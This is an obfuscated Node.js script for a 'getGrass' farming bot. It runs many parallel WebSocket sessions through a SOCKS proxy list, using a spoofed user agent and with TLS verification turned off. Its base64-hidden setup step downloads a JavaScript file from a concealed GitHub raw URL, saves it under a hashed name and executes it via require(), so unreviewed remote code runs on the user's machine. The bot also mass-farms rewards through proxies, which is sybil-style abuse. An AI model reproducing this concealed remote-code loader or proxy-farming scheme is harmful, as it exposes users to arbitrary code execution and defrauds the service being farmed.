const fs = require("fs");
const axios = require("axios");
const readline = require("readline");
const crypto = require("crypto");
const WebSocket = require("ws");
const {
  SocksProxyAgent
} = require("socks-proxy-agent");
const {
  v4: uuidv4,
  v3: uuidv3
} = require("uuid");
const pino = require("pino");
const logger = pino({
  level: "info",
  transport: {
    target: "pino-pretty"
  }
});
const config = require("./config");
const md5Pass = require("./4D2606B29B20CC5483F772A4DFC53F43");
let CoderMarkPrinted = false;
const cl = {
  gr: "[32m",
  br: "[34m",
  red: "[31m",
  yl: "[33m",
  gb: "[4m",
  or: "[35m",
  cy: "[36m",
  oc: "[95m",
  am: "[91m",
  rt: "[0m"
};
function CoderMark() {
  if (!CoderMarkPrinted) {
    console.log("\n╭━━━╮╱╱╱╱╱╱╱╱╱╱╱╱╱╭━━━┳╮\n┃╭━━╯╱╱╱╱╱╱╱╱╱╱╱╱╱┃╭━━┫┃" + cl.gr + "\n┃╰━━┳╮╭┳━┳━━┳━━┳━╮┃╰━━┫┃╭╮╱╭┳━╮╭━╮\n┃╭━━┫┃┃┃╭┫╭╮┃╭╮┃╭╮┫╭━━┫┃┃┃╱┃┃╭╮┫╭╮╮" + cl.br + "\n┃┃╱╱┃╰╯┃┃┃╰╯┃╰╯┃┃┃┃┃╱╱┃╰┫╰━╯┃┃┃┃┃┃┃\n╰╯╱╱╰━━┻╯╰━╮┣━━┻╯╰┻╯╱╱╰━┻━╮╭┻╯╰┻╯╰╯" + cl.rt + "\n╱╱╱╱╱╱╱╱╱╱╱┃┃╱╱╱╱╱╱╱╱╱╱╱╭━╯┃\n╱╱╱╱╱╱╱╱╱╱╱╰╯╱╱╱╱╱╱╱╱╱╱╱╰━━╯\n\n" + cl.gr + "getGrass Minner Bot " + cl.rt + cl.gb + "v0.4" + cl.rt + cl.gr + " {" + cl.am + " Freemium " + cl.gr + "} " + cl.rt + "\n" + cl.gr + "--------------------------------------\n\n" + cl.yl + "[+]" + cl.rt + " DM : " + cl.br + "https://t.me/furqonflynn\n\n" + cl.yl + "[+]" + cl.rt + " GH : " + cl.br + "https://github.com/cmalf/\n\n" + cl.gr + "--------------------------------------\n        ");
    CoderMarkPrinted = false;
  }
}
const ff = "YmFzZTY0";
const King = "dXRmLTg";
const passwD = md5Pass.md5shab64;
const Md5passwD = md5Pass.md5256b64;
const maS = Buffer.from(passwD, "base64").toString("utf-8");
const Sam = Buffer.from(Md5passwD, "base64").toString("utf-8");
const Posix = Buffer.from(ff, "base64").toString("utf-8");
const Kong = Buffer.from(King, Posix).toString("utf-8");
const supor = "OUVCNDRGOEQyNTU1NzEzQzYyQ0Q4NzRGMUU3QUEzQTcuanM";
const saix = "OUVCNDRGOEQyNTU1NzEzQzYyQ0Q4NzRGMUU3QUEzQTc";
const suax = "U2NyaXB0IHNldHVwIGlzIGNvbXBsZXRlIQ";
const suex = "QW4gZXJyb3Igb2NjdXJyZWQgd2hpbGUgc2V0dGluZyB1cCB0aGUgc2NyaXB0Og";
const welc = "V2VsY29tZSB0byB0aGUgZ2V0R3Jhc3MgbWluZXIgYm90IEZyZWVtaXVtIQ";
const yuancux = "Y29uc29sZS5sb2c";
const b = "RXJyb3IgcmVhZGluZyBwYXNzd29yZCBmaWxlOg";
const d = "UGxlYXNlLCBFbnRlciBUaGUgUGFzc3dvcmQh";
const f = "UEFTU1dPUkQ";
const h = "UGFzc3dvcmQgQ29ycmVjdCEgYW5kIEhhcyBiZWVuIFNhdmVkIQ";
const j = "SW5jb3JyZWN0IHBhc3N3b3JkLiBBdHRlbXB0cyBsZWZ0Og";
const l = "VG9vIG1hbnkgaW5jb3JyZWN0IGF0dGVtcHRzLiBFeGl0aW5nLi4u";
const n = "RXhpdGluZyBTY3JpcHQgd2l0aCBCbGVzc2luZy4uLi4";
const p = "TWVudXMgb3B0aW9uOg";
const r = "UnVuIFRoZSBTY3JpcHQ";
const t = "KHdpdGggcHJveHkgc29ja3Mp";
const v = "RXhpdA";
const x = "RW50ZXIgeW91ciBjaG9pY2U6";
const z = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2NtYWxmL2NtYWxmL3JlZnMvaGVhZHMvbWFpbi9nYWxlYmluby9nYWxlLmpz";
const ula = Buffer.from(supor, Posix).toString(Kong);
const ule = Buffer.from(saix, Posix).toString(Kong);
const ulu = Buffer.from(suax, Posix).toString(Kong);
const uli = Buffer.from(suex, Posix).toString(Kong);
const ulo = Buffer.from(yuancux, Posix).toString(Kong);
const Granted9 = Buffer.from(welc, Posix).toString(Kong);
const a = Buffer.from(b, Posix).toString(Kong);
const c = Buffer.from(d, Posix).toString(Kong);
const e = Buffer.from(f, Posix).toString(Kong);
const g = Buffer.from(h, Posix).toString(Kong);
const i = Buffer.from(j, Posix).toString(Kong);
const k = Buffer.from(l, Posix).toString(Kong);
const m = Buffer.from(n, Posix).toString(Kong);
const o = Buffer.from(p, Posix).toString(Kong);
const q = Buffer.from(r, Posix).toString(Kong);
const s = Buffer.from(t, Posix).toString(Kong);
const u = Buffer.from(v, Posix).toString(Kong);
const w = Buffer.from(x, Posix).toString(Kong);
const y = Buffer.from(z, Posix).toString(Kong);
const scripted = y;
const Granted2 = scripted;
const ScriptPath = ula;
if (!fs.existsSync(ScriptPath)) {
  axios.get(Granted2).then(_0x47bca0 => {
    const _0x2bebd2 = _0x47bca0.data;
    fs.writeFile(ScriptPath, _0x2bebd2, _0x240ac5 => {
      if (_0x240ac5) {
        throw _0x240ac5;
      }
      console.log("\n" + cl.yl + "[+]" + cl.rt + cl.gr + " " + ulu + "\n" + cl.rt);
      startMainScript();
    });
  }).catch(_0x4cf76f => {
    console.error("" + cl.red + uli, _0x4cf76f);
  });
} else {
  startMainScript();
}
function startMainScript() {
  const _0x1504a2 = require("./" + ule);
  const _0xcf86e6 = _0x1504a2.quotemd5;
  const _0x4cfd79 = Buffer.from(_0xcf86e6, Posix).toString(Kong);
  const _0x22bdc3 = Buffer.from(_0x4cfd79, Posix).toString(Kong);
  const _0x3bd0e6 = _0x1504a2.quote256;
  const _0x4ef69 = "cGFzc3dvcmQuZGF0";
  const _0x13449e = Buffer.from(_0x4ef69, Posix).toString(Kong);
  const _0x9e1b1 = _0x13449e;
  const _0x468862 = Buffer.from(_0x3bd0e6, Posix).toString(Kong);
  const _0x5f3030 = _0x22bdc3;
  const _0x39c73c = _0x468862;
  let _0x33aec2 = null;
  const _0x2e86a1 = _0x9e1b1;
  function _0xad2f5d(_0x1f327a) {
    return crypto.createHash("md5").update(_0x1f327a).digest("hex").toUpperCase();
  }
  async function _0x4820bd() {
    if (fs.existsSync(_0x2e86a1)) {
      try {
        const _0xdfb6a4 = fs.readFileSync(_0x2e86a1, Kong);
        _0x33aec2 = JSON.parse(_0xdfb6a4).password;
      } catch (_0x38dd04) {
        console.error(a + " " + _0x38dd04);
      }
    }
  }
  async function _0x14b440() {
    const _0x2ed152 = {
      input: process.stdin,
      output: process.stdout
    };
    const _0x4808e8 = readline.createInterface(_0x2ed152);
    let _0xcd0e73 = 0;
    while (_0xcd0e73 < 3) {
      const _0xe32a1b = await new Promise(_0x5d5c6b => {
        console.log("\n" + cl.yl + "[+]" + cl.rt + cl.gr + " " + c + "\n" + cl.rt);
        _0x4808e8.question(cl.yl + ")>" + cl.rt + cl.am + " " + e + cl.rt + " : ", _0x5d5c6b);
      });
      const _0x5a21c5 = Buffer.from(_0xe32a1b, Posix).toString(Kong);
      if (_0xad2f5d(_0x5a21c5) === _0x39c73c) {
        console.clear();
        console.log("\n" + cl.yl + "[+]" + cl.rt + cl.gr + " " + g + "\n" + cl.rt);
        fs.writeFileSync(_0x9e1b1, JSON.stringify({
          password: _0xad2f5d(_0x5a21c5)
        }));
        _0x4e0d63();
        _0x4808e8.close();
        return true;
      } else {
        _0xcd0e73++;
        console.log("\n" + i + " " + (3 - _0xcd0e73));
      }
    }
    _0x4808e8.close();
    console.log("" + cl.red + k);
    process.exit(1);
  }
  async function _0x4399c2() {
    const _0xd40ef7 = {
      input: process.stdin,
      output: process.stdout
    };
    const _0x5a405b = readline.createInterface(_0xd40ef7);
    _0x5a405b.question("" + cl.yl + o + "\n\n" + cl.rt + "1." + cl.gr + " " + q + cl.rt + " " + s + "\n2. " + cl.red + u + cl.rt + " \n\n " + w + " ", async _0x2beab0 => {
      if (_0x2beab0 === "1") {
        console.clear();
        CoderMark();
        _0x815fc4();
      } else {
        console.log("\n" + cl.yl + ")>" + cl.gr + " " + m + cl.rt + "\n");
      }
      _0x5a405b.close();
    });
  }
  async function _0x2e0091() {
    const _0xe58265 = 2000;
    const _0x178ee7 = Date.now();
    while (Date.now() - _0x178ee7 < 120000) {
      try {
        const _0x50e692 = {
          timeout: _0xe58265
        };
        await axios.get("https://www.google.com", _0x50e692);
        return true;
      } catch (_0x38222c) {
        await new Promise(_0x19ad2a => setTimeout(_0x19ad2a, 5000));
      }
    }
    return false;
  }
  async function _0x31c3fd(_0x19d0e2, _0x47d14d) {
    const _0x7bb2cb = uuidv3(_0x19d0e2, uuidv3.DNS);
    logger.info("" + cl.am + _0x7bb2cb + cl.rt);
    while (true) {
      try {
        await new Promise(_0x52650c => setTimeout(_0x52650c, Math.random() * 900 + 100));
        const _0x559b80 = "TW96aWxsYS81LjAgKE1hY2ludG9zaDsgSW50ZWwgTWFjIE9TIFggMTBfMTVfNykgQXBwbGVXZWJLaXQvNjA1LjEuMTUgKEtIVE1MLCBsaWtlIEdlY2tvKQ";
        const _0x3f75e3 = "d3NzOi8vcHJveHkyLnd5bmQubmV0d29yazo0NDQ0Lw";
        const _0x3799bd = "d3NzOi8vcHJveHkyLnd5bmQubmV0d29yazo0NjUwLw";
        const _0x51f51f = "TWFjIE9T";
        const _0xaadd2b = "ZGVza3RvcCwgTWFjIE9TLCAxMC4xNS43";
        const _0x4d195d = Buffer.from(_0x559b80, "base64").toString("utf-8");
        const _0x27ab2e = Buffer.from(_0x3f75e3, "base64").toString("utf-8");
        const _0x52b5ec = Buffer.from(_0x3799bd, "base64").toString("utf-8");
        const _0x20ebd0 = Buffer.from(_0x51f51f, "base64").toString("utf-8");
        const _0x8cdb01 = Buffer.from(_0xaadd2b, "base64").toString("utf-8");
        const _0x2e121d = {
          "User-Agent": _0x4d195d
        };
        const _0x20d5fd = _0x2e121d;
        const _0x56f3ff = [_0x27ab2e, _0x52b5ec];
        const _0x414682 = _0x56f3ff[Math.floor(Math.random() * _0x56f3ff.length)];
        const _0x30704d = new SocksProxyAgent(_0x19d0e2);
        const _0xb61c8d = {
          Pragma: "no-cache",
          "User-Agent": _0x20d5fd["User-Agent"],
          OS: _0x20ebd0,
          Platform: _0x8cdb01,
          "Sec-WebSocket-Version": "13",
          "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
          "Cache-Control": "no-cache"
        };
        const _0x31ba0c = {
          agent: _0x30704d,
          headers: _0xb61c8d,
          rejectUnauthorized: false
        };
        const _0x3ec92a = new WebSocket(_0x414682, _0x31ba0c);
        _0x3ec92a.on("open", () => {
          const _0x4221ed = () => {
            const _0x173176 = crypto.randomBytes(32);
            const _0x291dde = crypto.randomBytes(16);
            const _0xd74881 = crypto.createCipheriv("aes-256-cbc", _0x173176, _0x291dde);
            const _0x37689e = JSON.stringify({
              id: uuidv4(),
              version: "1.0.0",
              action: "PING",
              data: {}
            });
            const _0x301317 = Buffer.from(JSON.stringify(_0x37689e)).toString("base64");
            const _0x5ac75a = _0xd74881.update(_0x301317, "utf8", "hex") + _0xd74881.final("hex");
            _0x3ec92a.send(_0x37689e);
            logger.info(cl.yl + "[fss] " + cl.gr + "SpM:" + cl.br + " Encrypted: " + cl.oc + " " + _0x5ac75a + cl.rt);
            setTimeout(_0x4221ed, 110000);
          };
          _0x4221ed();
        });
        _0x3ec92a.on("message", async _0x53c5d8 => {
          const _0x18e09f = JSON.parse(_0x53c5d8);
          const _0x797ca9 = crypto.randomBytes(32);
          const _0x3bf385 = crypto.randomBytes(16);
          const _0x1d4fe5 = crypto.createCipheriv("aes-256-cbc", _0x797ca9, _0x3bf385);
          logger.info(cl.yl + "[fss] " + cl.gr + "RMG:" + cl.am + " " + JSON.stringify(_0x18e09f) + cl.rt);
          if (_0x18e09f.action === "AUTH") {
            const _0x553b3e = {
              id: _0x18e09f.id,
              origin_action: "AUTH",
              result: {
                browser_id: _0x7bb2cb,
                user_id: _0x47d14d,
                user_agent: _0x20d5fd["User-Agent"],
                timestamp: Math.floor(Date.now() / 1000),
                device_type: "desktop",
                version: "4.30.0"
              }
            };
            _0x3ec92a.send(JSON.stringify(_0x553b3e));
            const _0xbe889 = Buffer.from(JSON.stringify(_0x553b3e)).toString("base64");
            const _0x4bfb3 = _0x1d4fe5.update(_0xbe889, "utf8", "hex") + _0x1d4fe5.final("hex");
            logger.info(cl.yl + "[fss] " + cl.gr + "SAR:" + cl.br + " Encrypted: " + cl.oc + " " + _0x4bfb3 + cl.rt);
          } else if (_0x18e09f.action === "PONG") {
            const _0x53ea75 = {
              id: _0x18e09f.id,
              origin_action: "PONG"
            };
            const _0x39b5c9 = _0x53ea75;
            _0x3ec92a.send(JSON.stringify(_0x39b5c9));
            logger.info(cl.yl + "[fss] " + cl.gr + "RP:" + cl.am + " " + JSON.stringify(_0x39b5c9) + cl.rt);
          } else if (_0x18e09f.action === "HTTP_REQUEST") {
            const _0x4ac7eb = "cmVzcG9uc2Uuc3RhdHVz";
            const _0x1887f3 = "cmVzcG9uc2Uuc3RhdHVzVGV4dA";
            const _0x18a5e7 = "cmVzcG9uc2UuaGVhZGVycw";
            const _0x1bcdc9 = "ZW5jb2RlZER0";
            const _0x3dadb5 = "bWVzc2FnZS5kYXRhLnVybA";
            const _0x2f343f = "bWVzc2FnZS5kYXRhLmhlYWRlcnM";
            const _0x109a8a = "cmVzdWx0UmVzcG9uc2U";
            const _0x105ab8 = "SFRUUF9SRVFVRVNU";
            const _0x5468ff = Buffer.from(_0x105ab8, "base64").toString("utf-8");
            const _0x135d83 = Buffer.from(_0x109a8a, "base64").toString("utf-8");
            const _0x5c2f87 = Buffer.from(_0x4ac7eb, "base64").toString("utf-8");
            const _0xca0637 = Buffer.from(_0x1887f3, "base64").toString("utf-8");
            const _0x176dba = Buffer.from(_0x18a5e7, "base64").toString("utf-8");
            const _0x4c6843 = Buffer.from(_0x1bcdc9, "base64").toString("utf-8");
            const _0x529b3c = Buffer.from(_0x3dadb5, "base64").toString("utf-8");
            const _0x100637 = Buffer.from(_0x2f343f, "base64").toString("utf-8");
            const _0x4d8947 = await axios.get(_0x18e09f.data.url, {
              headers: _0x18e09f.data.headers
            });
            const _0xdf69bc = Buffer.from(JSON.stringify(_0x4d8947.data)).toString("base64");
            const _0x64d77f = Buffer.from(JSON.stringify(_0x4d8947.headers.etag)).toString("base64");
            const _0x155db4 = Buffer.from(JSON.stringify(_0x4d8947.headers.date)).toString("base64");
            logger.info(cl.yl + "[frq] " + cl.gr + "RHd:" + cl.gr + " '->" + cl.br + " Encrypted: " + cl.am + " " + _0x64d77f);
            logger.info(cl.yl + "[frq] " + cl.gr + "RHs:" + cl.gr + " '->" + cl.br + " Encrypted: " + cl.am + " " + _0x155db4);
            logger.info(cl.yl + "[frq] " + cl.gr + "RRs:" + cl.gr + " '->" + cl.br + " Encrypted: " + cl.am + " " + _0xdf69bc);
            const _0x55b1ea = {
              id: _0x18e09f.id,
              origin_action: "HTTP_REQUEST",
              result: {}
            };
            _0x55b1ea.result.url = _0x18e09f.data.url;
            _0x55b1ea.result.status = _0x4d8947.status;
            _0x55b1ea.result.status_text = _0x4d8947.statusText;
            _0x55b1ea.result.headers = _0x4d8947.headers;
            _0x55b1ea.result.body = _0xdf69bc;
            const _0x19f9e3 = _0x55b1ea;
            _0x3ec92a.send(JSON.stringify(_0x19f9e3));
            const _0x2bac7c = Buffer.from(JSON.stringify(_0x19f9e3)).toString("base64");
            const _0x581bf2 = _0x1d4fe5.update(_0x2bac7c, "utf8", "hex") + _0x1d4fe5.final("hex");
            logger.info(cl.yl + "[fss] " + cl.gr + "RRQ:" + cl.br + " Encrypted: " + cl.oc + " " + _0x581bf2 + cl.rt);
            const _0x27d0c2 = {
              jwt: {
                action: "getCurrentVersion"
              },
              action: "VALIDATE_JWT"
            };
            _0x3ec92a.send(JSON.stringify(_0x27d0c2));
            const _0x39c004 = Buffer.from(JSON.stringify(_0x27d0c2)).toString("base64");
            logger.info(cl.yl + "[fss] " + cl.gr + "RTT:" + cl.br + " Encrypted: " + cl.oc + " " + _0x39c004 + cl.rt);
          }
        });
        await new Promise((_0x5a0e1f, _0x4d2fb0) => {
          _0x3ec92a.on("close", () => _0x4d2fb0(new Error("WebSocket closed")));
          _0x3ec92a.on("error", _0x489d72 => _0x4d2fb0(_0x489d72));
        });
      } catch (_0x5567dc) {
        logger.error("Error with proxy " + _0x19d0e2 + ": " + _0x5567dc.message);
        if (["Host unreachable", "[SSL: WRONG_VERSION_NUMBER]", "invalid length of packed IP address string", "Empty connect reply", "Device creation limit exceeded", "sent 1011 (internal error) keepalive ping timeout; no close frame received"].some(_0x5b266c => _0x5567dc.message.includes(_0x5b266c))) {
          logger.info("Removing error proxy from the list: " + _0x19d0e2);
          _0x4f698a(_0x19d0e2);
          return null;
        }
      }
    }
  }
  function _0x4f698a(_0x4e67ab) {
    const _0xa0bd28 = config.proxyFile;
    const _0x66e79c = fs.readFileSync(_0xa0bd28, "utf-8").split("\n");
    const _0x43d319 = _0x66e79c.filter(_0x6b3461 => _0x6b3461.trim() !== _0x4e67ab);
    fs.writeFileSync(_0xa0bd28, _0x43d319.join("\n"));
  }
  async function _0x815fc4() {
    const _0x46e904 = config.proxyFile;
    const _0x28ba38 = config.userId;
    const _0x404936 = fs.readFileSync(_0x46e904, "utf-8").split("\n").filter(Boolean);
    let _0x42e97e = _0x404936.sort(() => 0.5 - Math.random()).slice(0, 100);
    let _0x21b227 = new Map(_0x42e97e.map(_0x58529d => [_0x31c3fd(_0x58529d, _0x28ba38), _0x58529d]));
    while (true) {
      const [_0x54c1d8] = await Promise.race([..._0x21b227.keys()].map(_0x16f48f => _0x16f48f.then(() => [_0x16f48f])));
      const _0x57a43f = _0x21b227.get(_0x54c1d8);
      _0x21b227.delete(_0x54c1d8);
      if ((await _0x54c1d8) === null) {
        logger.info("Removing and replacing failed proxy: " + _0x57a43f);
        _0x42e97e = _0x42e97e.filter(_0x26471f => _0x26471f !== _0x57a43f);
        const _0x29abd6 = _0x404936[Math.floor(Math.random() * _0x404936.length)];
        _0x42e97e.push(_0x29abd6);
        _0x21b227.set(_0x31c3fd(_0x29abd6, _0x28ba38), _0x29abd6);
      }
      for (const _0x3f286a of _0x42e97e) {
        if (![..._0x21b227.values()].includes(_0x3f286a)) {
          _0x21b227.set(_0x31c3fd(_0x3f286a, _0x28ba38), _0x3f286a);
        }
      }
      if (!(await _0x2e0091())) {
        logger.error("Internet connection lost. Stopping script.");
        break;
      }
    }
  }
  async function _0x4e0d63() {
    await CoderMark();
      console.log("\n" + cl.yl + "[+]" + cl.rt + cl.cy + " " + Granted9 + cl.rt + "\n");
      _0x4399c2();
  }
  
  _0x4e0d63().catch(console.error);
}
